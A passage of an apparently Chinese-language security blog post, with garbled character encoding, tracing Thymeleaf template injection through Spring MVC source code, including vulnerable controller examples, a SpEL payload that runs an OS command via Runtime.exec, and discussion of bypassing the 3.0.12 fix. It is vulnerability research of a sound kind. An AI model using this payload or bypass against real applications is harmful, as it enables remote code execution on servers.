çš„èµ„æº</span><br>            <span class="hljs-keyword">this</span>.cleanupMultipart(processedRequest);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png"></p><p>æ¥åˆ°ç¬¬517è¡Œï¼Œè¿›å…¥è§†å›¾æ¸²æŸ“çš„åœ°æ–¹ï¼Œè¯¥æ–¹æ³•å‰é¢åªæ˜¯ä¸€äº›å‚æ•°çš„å®šä¹‰å’Œåˆ¤æ–­</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A52.png"></p><p>ç›´æ¥åˆ°æ¥ç¬¬570è¡Œï¼Œè·Ÿè¿›render()ã€render()æ–¹æ³•ï¼Œçœ‹åå­—â€“&gt;è§†å›¾æ¸²æŸ“ã€‘</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A53.png"></p><p>åŒæ ·æ–¹æ³•çš„å‰é¢ä¸æ€ä¹ˆéœ€è¦å…³æ³¨ï¼Œä½†719è¡Œå¯ä»¥ç¨å¾®çœ‹ä¸€ä¸‹ã€è·å–æœ€ä¼˜è§†å›¾è§£æå™¨ã€‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, <span class="hljs-meta">@Nullable</span> Map&lt;String, Object&gt; model, Locale locale, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.viewResolvers != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// åˆ¤æ–­å½“å‰IOCå®¹å™¨ä¸­æ˜¯å¦æœ‰è§†å›¾è§£æå™¨</span><br>        Iterator var5 = <span class="hljs-keyword">this</span>.viewResolvers.iterator();<span class="hljs-comment">// å°†æ‰€æœ‰çš„è§†å›¾è§£æå™¨æ”¾åˆ°ä¸€ä¸ªè¿­ä»£å™¨é‡Œé¢è¿›è¡Œå¾ªç¯</span><br><br>        <span class="hljs-keyword">while</span>(var5.hasNext()) &#123;<span class="hljs-comment">// å¾ªç¯æ‰¾å‡ºæœ€ä¼˜è§†å›¾è§£æå™¨</span><br>            ViewResolver viewResolver = (ViewResolver)var5.next();<br>            <span class="hljs-comment">// æ ¹æ®è¯¥æ–¹æ³•ä¸­çš„ getBestView() å¯»æ‰¾æœ€ä¼˜è§†å›¾è§£æå™¨</span><br>            View view = viewResolver.resolveViewName(viewName, locale);<br>            <span class="hljs-keyword">if</span> (view != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> view;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A54.png"></p><p>æ¥åˆ°739è¡Œï¼Œè°ƒç”¨è·å–åˆ°çš„è§†å›¾è§£æå™¨çš„render()ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A55.png"></p><p>æ­¤æ—¶æ¥åˆ°<code>org.thymeleaf.spring5.view.ThymeleafView</code></p><p>ThymeleafViewä¸­çš„render()åˆå»è°ƒç”¨renderFragment()å¯¹è§†å›¾è¿›è¡Œæ¸²æŸ“ï¼Œè·Ÿè¿›</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A56.png"></p><p><code>renderFragment()</code>å‰é¢éƒ¨åˆ†åŒæ ·æ˜¯ä¸€äº›å‚æ•°çš„å®šä¹‰ä¸åˆ¤æ–­ï¼Œå•æ­¥æ¥åˆ°ThymeleafViewçš„101è¡Œï¼ŒçŒœæµ‹æ­¤å¤„åˆ¤æ–­è§†å›¾æ¸²æŸ“ä¸­æ˜¯å¦å­˜åœ¨<strong>ç‰‡æ®µè¡¨è¾¾å¼</strong></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A57.png"></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A58.png"></p><p>å•æ­¥å‘ä¸‹ï¼Œæ¥åˆ°Class ThymeleafViewçš„109è¡Œï¼Œæ­¤å¤„å¼€å§‹å¤„ç†è¡¨è¾¾å¼ï¼Œè·Ÿè¿›ã€‚æ­¤å¤„å†viewTemplateNameå¤–å¢åŠ äº†<code>~&#123;...&#125;~</code>ï¼Œä¹Ÿå°±æ˜¯ç‰‡æ®µè¡¨è¾¾å¼çš„æ ·å­ï¼Œ</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A59.png"></p><p>æ¥åˆ°<code>org.thymeleaf.standard.expression.StandardExpressionParser</code>çš„ç¬¬41è¡Œ</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A510.png"></p><p>è¿›è¡Œä¸€ä¸ªä¸‰æ­¥è¿ç®—ï¼Œé¢„å¤„ç†çš„å€¼ï¼Œæ¢ä¸ªæ€è·¯ä¹Ÿå°±æ˜¯ï¼Œåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å­˜åœ¨éœ€è¦æ‰§è¡Œçš„è¡¨è¾¾å¼ï¼Œå¦‚æœæœ‰åˆ™æ‰§è¡Œä¸€ä¸‹è¡¨è¾¾å¼ï¼Œæ²¡æœ‰åˆ™ç›´æ¥è¿”å›ï¼Œè·Ÿè¿›ï¼Œå› ä¸ºpreprocessä¼ å…¥çš„å€¼æ˜¯trueï¼Œæ‰€ä»¥ä¸€å®šæ˜¯æ‰§è¡Œ<code>StandardExpressionPreprocessor.preprocess(context, input)</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A511.png"></p><p>æ¥åˆ°<code>org.thymeleaf.standard.expression.StandardExpressionPreprocessor</code>ç¬¬17è¡Œï¼Œå…ˆæ˜¯åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å­˜åœ¨<code>_</code>ï¼Œä¹Ÿå°±æ˜¯æƒ³çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨éœ€è¦é¢„å¤„ç†çš„ä¸œè¥¿</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A512.png"></p><p>æ­£åˆ™åŒ¹é…ï¼Œæ ¹æ®è¯¥ç±»å®šä¹‰çš„æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> PREPROCESS_DELIMITER = <span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String PREPROCESS_EVAL = <span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Pattern PREPROCESS_EVAL_PATTERN = Pattern.compile(<span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>, <span class="hljs-number">32</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A513.png"></p><p>ç„¶åæ˜¯åˆ¤æ–­ä¸€ä¸‹æ²¡æœ‰åŒ¹é…åˆ°ä¸œè¥¿ï¼Œæ²¡æœ‰åŒ¹é…åˆ°<code>return checkPreprocessingMarkUnescaping(input);</code></p><p>æ¥ä¸‹æ¥è¿›å…¥<code>do...while&#123;&#125;</code>å¾ªç¯,å»åˆ¤æ–­ä¸€ä¸‹é¢„å¤„ç†è¡¨è¾¾å¼ä¸­æ˜¯å¦åŒ…å«äº†å¦ä¸€ä¸ªé¢„å¤„ç†è¡¨è¾¾å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">do</span> &#123;<br>    remaining = checkPreprocessingMarkUnescaping(input.substring(curr, matcher.start(<span class="hljs-number">0</span>)));<br>    String expressionText = checkPreprocessingMarkUnescaping(matcher.group(<span class="hljs-number">1</span>));<span class="hljs-comment">// æå–åŒä¸‹åˆ’çº¿ä¸­é—´çš„å€¼</span><br>    strBuilder.append(remaining);<br>    IStandardExpression expression = StandardExpressionParser.parseExpression(context, expressionText, <span class="hljs-keyword">false</span>);<span class="hljs-comment">// åˆæ¥äº†ä¸€éåˆšæ‰é‚£ä¸ªä¸‰ç›®è¿ç®—ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åˆ¤æ–­æ˜¯å¦è¡¨è¾¾å¼é‡Œé¢åŒ…å«è¡¨è¾¾å¼</span><br>    <span class="hljs-keyword">if</span> (expression == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><span class="hljs-comment">// æ‰§è¡Œè¡¨è¾¾å¼çš„åœ°æ–¹</span><br>    Object result = expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);<br>    strBuilder.append(result);<br>    curr = matcher.end(<span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">while</span>(matcher.find());<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›ä¹‹åï¼Œæ¥åˆ°<code>org.thymeleaf.standard.expression.Expression</code>çš„ç¬¬54è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// class  org.thymeleaf.standard.expression.Expression  execute()</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">execute</span><span class="hljs-params">(IExpressionContext context, StandardExpressionExecutionContext expContext)</span> </span>&#123;<br>    Validate.notNull(context, <span class="hljs-string">&quot;Context cannot be null&quot;</span>);<span class="hljs-comment">// contextæ˜¯å¦ä¸ºç©º</span><br>    IStandardVariableExpressionEvaluator variableExpressionEvaluator = StandardExpressions.getVariableExpressionEvaluator(context.getConfiguration());<span class="hljs-comment">// è·å–è¡¨è¾¾å¼è§£æå¼•æ“ï¼Œæ­¤å¤„ä¸ºSpringEL</span><br>    Object result = execute(context, <span class="hljs-keyword">this</span>, variableExpressionEvaluator, expContext);<span class="hljs-comment">// æ‰§è¡Œï¼Œç»§ç»­è·Ÿè¿›</span><br>    <span class="hljs-keyword">return</span> LiteralValue.unwrap(result);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A514.png"></p><p>æ¥åˆ°ç¬¬40è¡Œï¼Œåˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦ä¸ºç®€å•çš„è¡¨è¾¾å¼ã€ä¹Ÿå°±æ˜¯Thymeleafä¸­å¸¸ç”¨çš„é‚£å‡ ä¸ªã€‘</p><p>è·Ÿè¿›<code>SimpleExpression.executeSimple(context, (SimpleExpression)expression, expressionEvaluator, expContext);</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A515.png"></p><p>æ¥åˆ°<code>org.thymeleaf.standard.expression.SimpleExpression</code>çš„ç¬¬20è¡Œï¼Œåˆ¤æ–­ä¼ å…¥çš„ä¸ºä½•ç§è¡¨è¾¾å¼ç±»å‹ï¼Œç„¶åæ ¹æ®ä¼ å…¥è¿›è¡Œé€‰æ‹©ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A516.png"></p><p>æ¥åˆ°<code>org.thymeleaf.standard.expression.VariableExpression</code>ç¬¬74è¡Œï¼Œèµ°åˆ°79è¡Œ</p><p>expressionEvaluatorä¸ºè·å–åˆ°çš„è¡¨è¾¾å¼è§£æå™¨</p><p>expressionä¸ºä¼ å…¥çš„å€¼ã€ç»è¿‡ä¸€ç³»åˆ—å¤„ç†çš„å€¼ã€‘</p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A517.png"></p><p>æ¥åˆ°<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>ç¬¬20è¡Œï¼Œå•æ­¥å‘ä¸‹</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A518.png"></p><p>ç»§ç»­å‘ä¸‹ï¼Œèµ°åˆ°ç¬¬90è¡Œ</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A519.png"></p><p>å†å¾€ä¸‹å°±æ˜¯SpringELè¡¨è¾¾å¼çš„ä¸œè¥¿äº†ï¼Œå°±ä¸æ˜¯æˆ‘èƒ½çœ‹æ‡‚çš„äº†ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸ç»§ç»­å‘ä¸‹è·Ÿäº†ï¼Œåˆ°è¿™é‡ŒåŸºæœ¬ä¸Šç®—æ˜¯Thymeleafçš„ä¸œè¥¿è·Ÿå®Œäº†ï¼Œæ‰§è¡Œä¸€ä¸‹</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A520.png"></p><p>ç®€å•æ€»ç»“ä¸€ä¸‹</p><p>1.è·å–ViewAndModleå¯¹è±¡</p><p>2.æ ¹æ®Viewé€‰æ‹©æœ€ä¼˜è§†å›¾è§£æå™¨è¿›è¡Œrender()</p><p>3.è¿›å…¥Thymeleafè§†å›¾è§£æå™¨ä¹‹åï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>::</code>ï¼Œå­˜åœ¨çš„è¯åˆ™è¿›è¡Œè¡¨è¾¾å¼çš„å¤„ç†</p><p>4.åœ¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>_</code>ï¼Œå­˜åœ¨åˆ™è®¤ä¸ºæ˜¯æœ‰éœ€è¦é¢„å¤„ç†çš„è¯­å¥</p><p>5.æ ¹æ®ä¼ å…¥å†…å®¹ï¼Œé€‰æ‹©ç›¸åº”çš„è¡¨è¾¾å¼å¤„ç†å™¨</p><p>6.æ‰§è¡ŒSpringELè¡¨è¾¾å¼</p><h4 id="åœºæ™¯2"><a href="#åœºæ™¯2" class="headerlink" title="åœºæ™¯2"></a>åœºæ™¯2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ç§åœºæ™¯ä¸‹ï¼Œå…¶å®ç°çš„åŸç†åŸºæœ¬æ˜¯ç›¸åŒçš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯expéœ€è¦æ”¹å˜ä¸€ä¸‹ï¼Œéœ€è¦åœ¨åŸæœ¬çš„expæœ€ååŠ ä¸Šä¸€ä¸ª.</p><p>expï¼š<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__.</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A522.png"></p><p>è¿™æ˜¯å› ä¸ºspringMVCåœ¨æ¥æ”¶åˆ°æ­¤ç±»è¯·æ±‚æ—¶ï¼Œä¼šå¯¹åœ°å€è¿›è¡Œä¸€ä¸ªå¤„ç†ï¼Œä¼šå°†æœ€åä¸€ä¸ªç‚¹<code>.</code>ä¹‹åçš„æ•°æ®è£å‰ªæ‰</p><p>è¿˜æ˜¯<code>DispatcherServlet</code>ä¸­ha.handlerå¤„ä¸‹æ–­ï¼Œæ¥åˆ°ç¬¬509è¡Œå¤„ï¼Œè·Ÿè¿›</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A523.png"></p><p>æ¥åˆ°<code>applyDefaultViewName</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ç¬¬536è¡Œ</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A524.png"></p><p>æ¥åˆ°ï¼Œæ­¤å¤„æ²¡æœ‰è¿›è¡Œå¤„ç†ï¼Œç»§ç»­è·Ÿè¿›å°±å®Œäº†</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A525.png"></p><p>æ¥åˆ°<code>org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator</code>ï¼Œç»§ç»­è·Ÿè¿›ç¬¬72è¡Œ</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A526.png"></p><p>æ¥åˆ°<code>transformPath()</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A527.png"></p><p><code>stripFilenameExtension()</code>è¯¦æƒ…å¦‚ä¸‹ï¼Œå°±æ˜¯å°†æœ€åä¸€ä¸ªç‚¹<code>.</code>ä»¥åŠè¯¥ç‚¹ä¹‹åçš„å†…å®¹è£å‰ªæ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">stripFilenameExtension</span><span class="hljs-params">(String path)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> extIndex = path.lastIndexOf(<span class="hljs-number">46</span>);<span class="hljs-comment">// 46å¯¹åº”ASCIIç ä¸­çš„ . </span><br>    <span class="hljs-keyword">if</span> (extIndex == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> path;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">int</span> folderIndex = path.lastIndexOf(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span> folderIndex &gt; extIndex ? path : path.substring(<span class="hljs-number">0</span>, extIndex);<span class="hljs-comment">// è£å‰ª</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œexpéœ€è¦å˜å½¢çš„åœ°æ–¹å°±é€šé€äº†ï¼Œä¸€è·¯è¿”å›åˆ°<code>DispatcherServlet</code>çš„509è¡Œå°±okï¼Œå†ç„¶åå°±å’Œåœºæ™¯1ç›¸åŒäº†</p><h3 id="0x04-ä¿®å¤æ–¹æ¡ˆ"><a href="#0x04-ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="0x04 ä¿®å¤æ–¹æ¡ˆ"></a>0x04 ä¿®å¤æ–¹æ¡ˆ</h3><h4 id="1-å‡çº§æ–°ç‰ˆ"><a href="#1-å‡çº§æ–°ç‰ˆ" class="headerlink" title="1.å‡çº§æ–°ç‰ˆ"></a>1.å‡çº§æ–°ç‰ˆ</h4><p>æ­¤å¤„å¤ç°æ—¶é€‰ç”¨çš„thymeleafç‰ˆæœ¬æ˜¯3.0.11ï¼Œåˆ°ç›®å‰ä¸ºæ­¢å·²ç»æœ‰äº†æœ‰äº†3.0.15</p><h5 id="3-0-12-åœºæ™¯1ç»•è¿‡"><a href="#3-0-12-åœºæ™¯1ç»•è¿‡" class="headerlink" title="3.0.12 åœºæ™¯1ç»•è¿‡"></a>3.0.12 åœºæ™¯1ç»•è¿‡</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Thymeleaf3.0.12å®˜æ–¹ä¿®å¤äº†è¯¥é—®ï¼Œä½†ä»å­˜åœ¨ç»•è¿‡çš„å¯èƒ½æ€§ï¼Œæ•…è¿™é‡Œè¯´ä¸€ä¸‹</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A538.png"></p><p>æ›´æ”¹ä¸‹pomæ–‡ä»¶ï¼Œåˆ·æ–°ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.12.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A537.png"></p><p>ç›´æ¥æ¥åˆ°<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>çš„ç¬¬156è¡Œ</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A539.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// éœ€è¦è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªfalseï¼Œè¿™æ ·å°±ä¸ä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">containsSpELInstantiationOrStatic</span><span class="hljs-params">(String expression)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> explen = expression.length();<br>    <span class="hljs-keyword">int</span> n = explen;<span class="hljs-comment">// è¡¨è¾¾å¼é•¿åº¦</span><br>    <span class="hljs-keyword">int</span> ni = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> si = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span>(n-- != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// ä»å³å¾€å·¦éå†</span><br>        <span class="hljs-keyword">char</span> c = expression.charAt(n);<span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æœ‰wenï¼Œä¹Ÿå°±æ˜¯newçš„å€’å™</span><br>        <span class="hljs-keyword">if</span> (ni &gt;= NEW_LEN || c != NEW_ARRAY[ni] || ni &lt;= <span class="hljs-number">0</span> &amp;&amp; (n + <span class="hljs-number">1</span> &gt;= explen || !Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>)))) &#123;<br>            <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>                n += ni;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                    si = -<span class="hljs-number">1</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                    si = n;<br>                &#125; 